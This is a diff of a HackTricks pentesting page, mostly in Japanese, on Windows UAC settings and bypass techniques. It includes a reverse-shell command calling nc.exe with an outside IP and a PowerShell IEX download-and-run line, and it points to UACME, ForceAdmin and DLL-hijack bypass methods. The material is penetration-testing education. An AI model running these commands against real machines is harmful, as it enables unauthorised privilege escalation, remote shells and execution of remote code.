@@ -1,32 +1,32 @@
 # UAC - ユーザーアカウント制御
 
 {% hint style="success" %}
-AWSハッキングを学び、実践する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、実践する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricksをサポートする</summary>
+<summary>Support HackTricks</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)を使用して、世界で最も高度なコミュニティツールによって駆動される**ワークフローを簡単に構築し、自動化**します。\
-今すぐアクセスを取得：
+Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 ## UAC
 
-[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**昇格された活動のための同意プロンプトを有効にする**機能です。アプリケーションには異なる`integrity`レベルがあり、**高いレベル**のプログラムは、**システムを危険にさらす可能性のある**タスクを実行できます。UACが有効になっている場合、アプリケーションやタスクは常に**非管理者アカウントのセキュリティコンテキストの下で実行され**、管理者が明示的にこれらのアプリケーション/タスクに管理者レベルのアクセスを許可しない限り、システムを実行することはできません。これは、管理者が意図しない変更から保護される便利な機能ですが、セキュリティ境界とは見なされません。
+[ユーザーアカウント制御 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格された活動のための同意プロンプト**を有効にする機能です。アプリケーションには異なる `integrity` レベルがあり、**高いレベル**のプログラムは、**システムを危険にさらす可能性のある**タスクを実行できます。UACが有効になっている場合、アプリケーションやタスクは常に**非管理者アカウントのセキュリティコンテキストの下で実行され**、管理者が明示的にこれらのアプリケーション/タスクに管理者レベルのアクセスを許可しない限り、システムを実行することはできません。これは、管理者が意図しない変更から保護される便利な機能ですが、セキュリティ境界とは見なされません。
 
-インテグリティレベルに関する詳細情報：
+インテグリティレベルに関する詳細情報:
 
 {% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
 [integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
@@ -40,7 +40,7 @@ UACが有効な場合、管理者ユーザーには2つのトークンが与え�
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
 | [ユーザーアカウント制御：組み込みの管理者アカウントの管理者承認モード](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 無効                                                       |
 | [ユーザーアカウント制御：UIAccessアプリケーションがセキュアデスクトップを使用せずに昇格を要求できるようにする](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 無効                                                       |
-| [ユーザーアカウント制御：管理者の管理者承認モードにおける昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 非Windowsバイナリに対して同意を求めるプロンプト            |
+| [ユーザーアカウント制御：管理者の昇格プロンプトの動作（管理者承認モード）](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | 非Windowsバイナリに対して同意を求めるプロンプト            |
 | [ユーザーアカウント制御：標準ユーザーの昇格プロンプトの動作](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | セキュアデスクトップでの資格情報を求めるプロンプト        |
 | [ユーザーアカウント制御：アプリケーションのインストールを検出し、昇格を要求する](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 有効（ホームのデフォルト）無効（エンタープライズのデフォルト） |
 | [ユーザーアカウント制御：署名され、検証された実行可能ファイルのみを昇格させる](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 無効                                                       |
@@ -51,13 +51,13 @@ UACが有効な場合、管理者ユーザーには2つのトークンが与え�
 
 ### UACバイパス理論
 
-一部のプログラムは、**ユーザーが** **管理者グループに属している場合**、**自動的に自動昇格**されます。これらのバイナリには、_**Manifests**_内に_**autoElevate**_オプションが_**True**_の値で含まれています。バイナリは、**Microsoftによって署名されている必要があります**。
+一部のプログラムは、**ユーザーが** **管理者グループに属している場合**、**自動的に自動昇格**されます。これらのバイナリには、_**Manifests**_ 内に _**autoElevate**_ オプションが _**True**_ の値で含まれています。バイナリは、**Microsoftによって署名されている必要があります**。
 
 次に、**UACをバイパスする**ために（**中**のインテグリティレベルから**高**に昇格する）、一部の攻撃者はこの種のバイナリを使用して**任意のコードを実行**します。なぜなら、それは**高いレベルのインテグリティプロセス**から実行されるからです。
 
 バイナリの_**Manifest**_を確認するには、Sysinternalsのツール_**sigcheck.exe**_を使用できます。また、_Process Explorer_または_SysinternalsのProcess Monitor_を使用してプロセスの**インテグリティレベル**を確認できます。
 
-### UACを確認する
+### UACの確認
 
 UACが有効かどうかを確認するには、次の操作を行います：
 ```
@@ -66,9 +66,9 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-もし**`1`**であれば、UACは**有効**です。もし**`0`**であるか、**存在しない**場合は、UACは**無効**です。
+もしそれが **`1`** であれば、UACは **有効** です。もしそれが **`0`** であるか、**存在しない** のであれば、UACは **無効** です。
 
-次に、**どのレベル**が設定されているかを確認します：
+次に、**どのレベル** が設定されているかを確認します：
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
 
@@ -76,23 +76,23 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 ```
 * **`0`** の場合、UACはプロンプトを表示しません（**無効**のように）
-* **`1`** の場合、管理者は**ユーザー名とパスワード**を求められ、高権限でバイナリを実行します（セキュアデスクトップ上で）
-* **`2`** （**常に通知**）の場合、UACは管理者が高権限で何かを実行しようとするたびに常に確認を求めます（セキュアデスクトップ上で）
-* **`3`** の場合、`1`のようですが、セキュアデスクトップ上で必要ではありません
-* **`4`** の場合、`2`のようですが、セキュアデスクトップ上で必要ではありません
-* **`5`** （**デフォルト**）の場合、管理者に高権限で非Windowsバイナリを実行するための確認を求めます
+* **`1`** の場合、管理者は**ユーザー名とパスワード**を要求されて、バイナリを高い権限で実行します（セキュアデスクトップ上で）
+* **`2`** の場合（**常に通知**）、UACは管理者が高い権限で何かを実行しようとするたびに常に確認を求めます（セキュアデスクトップ上で）
+* **`3`** の場合、`1` と同様ですが、セキュアデスクトップ上で必要ありません
+* **`4`** の場合、`2` と同様ですが、セキュアデスクトップ上で必要ありません
+* **`5`** の場合（**デフォルト**）、非Windowsバイナリを高い権限で実行するために管理者に確認を求めます
 
 次に、**`LocalAccountTokenFilterPolicy`** の値を確認する必要があります。\
-値が **`0`** の場合、**RID 500** ユーザー（**組み込み管理者**）のみが**UACなしで管理タスク**を実行でき、`1` の場合は、**「Administrators」** グループ内のすべてのアカウントがそれを実行できます。
+値が **`0`** の場合、**RID 500** ユーザー（**組み込みの管理者**）のみが**UACなしで管理タスク**を実行でき、`1` の場合は、**「Administrators」** グループ内のすべてのアカウントがそれを実行できます。
 
 最後に、キー **`FilterAdministratorToken`** の値を確認します。\
-**`0`**（デフォルト）の場合、**組み込み管理者アカウントは**リモート管理タスクを実行でき、**`1`** の場合、組み込み管理者アカウントは**リモート管理タスクを実行できません**が、`LocalAccountTokenFilterPolicy` が `1` に設定されている場合を除きます。
+**`0`**（デフォルト）の場合、**組み込みの管理者アカウントは**リモート管理タスクを実行でき、**`1`** の場合、組み込みの管理者アカウントは**リモート管理タスクを実行できません**が、`LocalAccountTokenFilterPolicy` が `1` に設定されている場合を除きます。
 
 #### 概要
 
 * `EnableLUA=0` または **存在しない**場合、**誰に対してもUACなし**
 * `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=1`** の場合、誰に対してもUACなし
-* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ **`FilterAdministratorToken=0`** の場合、RID 500（組み込み管理者）に対してUACなし
+* `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ **`FilterAdministratorToken=0`** の場合、RID 500（組み込みの管理者）に対してUACなし
 * `EnableLua=1` かつ **`LocalAccountTokenFilterPolicy=0`** かつ **`FilterAdministratorToken=1`** の場合、全員に対してUACあり
 
 このすべての情報は、**metasploit** モジュール `post/windows/gather/win_privs` を使用して収集できます。
@@ -108,13 +108,13 @@ whoami /groups | findstr Level
 被害者にグラフィカルアクセスがある場合、UACバイパスは簡単です。UACプロンプトが表示されたときに「はい」をクリックするだけです。
 {% endhint %}
 
-UACバイパスが必要な状況は次のとおりです：**UACが有効で、プロセスが中程度の整合性コンテキストで実行されており、ユーザーが管理者グループに属している場合**。
+UACバイパスは以下の状況で必要です: **UACが有効で、プロセスが中程度の整合性コンテキストで実行されており、ユーザーが管理者グループに属している場合**。
 
 UACが最高のセキュリティレベル（常に）に設定されている場合、他のレベル（デフォルト）の場合よりも**UACをバイパスするのははるかに難しい**ことを言及することが重要です。
 
 ### UAC無効
 
-UACがすでに無効になっている場合（`ConsentPromptBehaviorAdmin`が**`0`**）、次のようなもので**管理者権限でリバースシェルを実行**できます（高整合性レベル）。
+UACがすでに無効になっている場合（`ConsentPromptBehaviorAdmin`が**`0`**）、次のようなもので**管理者権限でリバースシェルを実行**できます:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -127,7 +127,7 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 
 ### **非常に** 基本的なUAC "バイパス"（フルファイルシステムアクセス）
 
-Administratorsグループに属するユーザーのシェルがあれば、**C$**共有をSMB（ファイルシステム）経由で新しいディスクにマウントすることができ、**ファイルシステム内のすべてにアクセスできます**（Administratorのホームフォルダも含む）。
+管理者グループに属するユーザーのシェルがある場合、**C$** 共有をSMB（ファイルシステム）経由で新しいディスクにマウントすることで、**ファイルシステム内のすべてにアクセスできます**（管理者のホームフォルダも含む）。
 
 {% hint style="warning" %}
 **このトリックはもう機能していないようです**
@@ -161,8 +161,8 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 ### UAC バイパスエクスプロイト
 
-[**UACME**](https://github.com/hfiref0x/UACME) は、いくつかの UAC バイパスエクスプロイトの **コンパイル** です。**UACME を Visual Studio または msbuild を使用してコンパイルする必要があります**。コンパイルにより、いくつかの実行可能ファイル（例: `Source\Akagi\outout\x64\Debug\Akagi.exe`）が作成されます。**どれが必要かを知っておく必要があります。**\
-**注意が必要** です。なぜなら、いくつかのバイパスは **他のプログラムを促す** ことがあり、**ユーザー** に何かが起こっていることを **警告** します。
+[**UACME**](https://github.com/hfiref0x/UACME) は、いくつかの UAC バイパスエクスプロイトの **コンパイル** です。**UACME を Visual Studio または msbuild を使用してコンパイルする必要があります**。コンパイルにより、いくつかの実行可能ファイル（例えば `Source\Akagi\outout\x64\Debug\Akagi.exe`）が作成されます。**どれが必要かを知っておく必要があります。**\
+**注意が必要です**。なぜなら、いくつかのバイパスは **他のプログラムを促す** ことがあり、**ユーザー** に何かが起こっていることを **警告** します。
 
 UACME には、各技術が動作し始めた **ビルドバージョン** があります。あなたのバージョンに影響を与える技術を検索できます：
 ```
@@ -172,61 +172,61 @@ Major  Minor  Build  Revision
 -----  -----  -----  --------
 10     0      14393  0
 ```
-また、[この](https://en.wikipedia.org/wiki/Windows\_10\_version\_history)ページを使用すると、ビルドバージョンからWindowsリリース`1607`を取得できます。
+Also, using [this](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) page you get the Windows release `1607` from the build versions.
 
-#### さらなるUACバイパス
+#### More UAC bypass
 
-**ここで使用されるすべての技術は、AUCをバイパスするために** **完全なインタラクティブシェル** **を必要とします**（一般的なnc.exeシェルでは不十分です）。
+**すべて**の技術は、AUCをバイパスするために**完全なインタラクティブシェル**を必要とします（一般的なnc.exeシェルでは不十分です）。
 
-**meterpreter**セッションを使用して取得できます。**Session**値が**1**に等しい**プロセス**に移行します：
+**meterpreter**セッションを使用して取得できます。**Session**値が**1**の**プロセス**に移行します：
 
 ![](<../../.gitbook/assets/image (863).png>)
 
-（_explorer.exe_は動作するはずです）
+(_explorer.exe_ は動作するはずです)
 
-### GUIを使用したUACバイパス
+### UAC Bypass with GUI
 
-**GUIにアクセスできる場合、UACプロンプトが表示されたときにそれを受け入れるだけで済みます。** 実際にはバイパスは必要ありません。したがって、GUIにアクセスすることでUACをバイパスできます。
+**GUIにアクセスできる場合は、UACプロンプトが表示されたときにそれを受け入れるだけで済みます。** バイパスは本当に必要ありません。したがって、GUIにアクセスすることでUACをバイパスできます。
 
-さらに、誰かが使用していたGUIセッション（おそらくRDP経由）を取得した場合、**管理者として実行されるいくつかのツールがあり**、そこから**管理者として**直接**cmd**を**実行**できる可能性があります。UACによって再度プロンプトが表示されることはありません。たとえば、[**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。これは少し**ステルス**かもしれません。
+さらに、誰かが使用していたGUIセッション（おそらくRDP経由）を取得した場合、**管理者として実行されるいくつかのツール**があり、そこから**cmd**を例えば**管理者として**直接実行でき、再度UACによるプロンプトが表示されることはありません。 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。これは少し**ステルス**かもしれません。
 
-### 騒がしいブルートフォースUACバイパス
+### Noisy brute-force UAC bypass
 
-騒がしいことを気にしない場合は、常に[**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin)のようなものを**実行**して、**ユーザーが受け入れるまで権限を昇格させるように要求する**ことができます。
+騒がしくなることを気にしない場合は、常に**次のようなものを実行できます** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) それは**ユーザーが受け入れるまで権限を昇格するように要求します**。
 
-### 自分自身のバイパス - 基本的なUACバイパス手法
+### Your own bypass - Basic UAC bypass methodology
 
-**UACME**を見てみると、**ほとんどのUACバイパスはDLLハイジャックの脆弱性を悪用しています**（主に悪意のあるdllを_C:\Windows\System32_に書き込むこと）。[DLLハイジャックの脆弱性を見つける方法を学ぶには、これをお読みください](../windows-local-privilege-escalation/dll-hijacking/)。
+**UACME**を見てみると、**ほとんどのUACバイパスはDLLハイジャックの脆弱性を悪用しています**（主に悪意のあるdllを_C:\Windows\System32_に書き込むこと）。 [DLLハイジャックの脆弱性を見つける方法を学ぶには、これを読んでください](../windows-local-privilege-escalation/dll-hijacking/)。
 
 1. **自動昇格**するバイナリを見つけます（実行時に高い整合性レベルで実行されることを確認します）。
-2. procmonを使用して、**DLLハイジャック**に脆弱な**"NAME NOT FOUND"**イベントを見つけます。
-3. 書き込み権限がない**保護されたパス**（C:\Windows\System32など）内にDLLを**書き込む**必要があるかもしれません。これをバイパスするには：
-   1. **wusa.exe**：Windows 7、8、8.1。CABファイルの内容を保護されたパス内に抽出することができます（このツールは高い整合性レベルから実行されるため）。
+2. procmonを使用して、**DLLハイジャック**に脆弱な"**NAME NOT FOUND**"イベントを見つけます。
+3. おそらく、**書き込み権限がない**いくつかの**保護されたパス**（C:\Windows\System32など）内にDLLを**書き込む**必要があります。これを回避するには、次のものを使用できます：
+   1. **wusa.exe**：Windows 7,8および8.1。これは、保護されたパス内にCABファイルの内容を抽出することを許可します（このツールは高い整合性レベルから実行されるため）。
    2. **IFileOperation**：Windows 10。
 4. 保護されたパス内にDLLをコピーし、脆弱で自動昇格されたバイナリを実行するための**スクリプト**を準備します。
 
-### 別のUACバイパス技術
+### Another UAC bypass technique
 
-**自動昇格バイナリ**が**実行される**ための**バイナリ**または**コマンド**の**名前/パス**を**レジストリ**から**読み取ろうとする**のを監視することに基づいています（このバイナリが**HKCU**内でこの情報を検索する場合、より興味深いです）。
+**自動昇格されたバイナリ**が**実行される**ための**バイナリ**または**コマンド**の**名前/パス**を**レジストリ**から**読み取ろうとする**のを監視することに基づいています（これは、バイナリが**HKCU**内でこの情報を検索する場合により興味深いです）。
 
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)を使用して、世界で最も**高度な**コミュニティツールによって強化された**ワークフロー**を簡単に構築および**自動化**します。\
-今すぐアクセスを取得：
+Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
+Get Access Today:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
 {% hint style="success" %}
-AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricksをサポートする</summary>
+<summary>Support HackTricks</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
-* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter**で**フォロー**してください🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
-* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
